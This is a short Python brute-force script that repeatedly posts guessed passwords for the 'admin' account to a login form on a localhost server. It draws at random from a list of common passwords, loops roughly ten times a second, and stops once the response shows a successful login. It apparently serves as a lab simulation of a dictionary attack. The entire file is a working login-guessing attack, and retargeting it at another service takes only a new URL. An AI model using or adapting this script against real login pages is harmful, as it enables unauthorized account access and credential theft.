import requests
import time
import random

# --- CONFIGURATION ---
TARGET_URL = "http://127.0.0.1:5000/"
USERNAME = "admin"  # The target user
# A small list of passwords to simulate a dictionary attack
PASSWORD_LIST = [
    "123456", "password", "admin", "welcome", "login", 
    "secure", "admin123", "pass123", "qwerty", "letmein"
]

def start_attack():
    print(f"🔥 STARTING BRUTE FORCE ATTACK ON {TARGET_URL}...")
    
    # Infinite loop to keep attacking until you stop it
    counter = 0
    while True:
        password = random.choice(PASSWORD_LIST)
        
        # Data packet to send to the server
        payload = {
            'username': USERNAME,
            'password': password
        }
        
        try:
            # Send the POST request (Attempt Login)
            response = requests.post(TARGET_URL, data=payload)
            
            if "Welcome" in response.text:
                print(f"[+] CRACKED! Password is: {password}")
                break # Stop if we found it
            else:
                print(f"[-] Failed ({counter}): {password}")
            
            counter += 1
            
            # Speed of attack (0.1s is very fast, humanly impossible)
            time.sleep(0.1) 
            
        except Exception as e:
            print(f"Connection Error: {e}")
            break

if __name__ == "__main__":
    start_attack()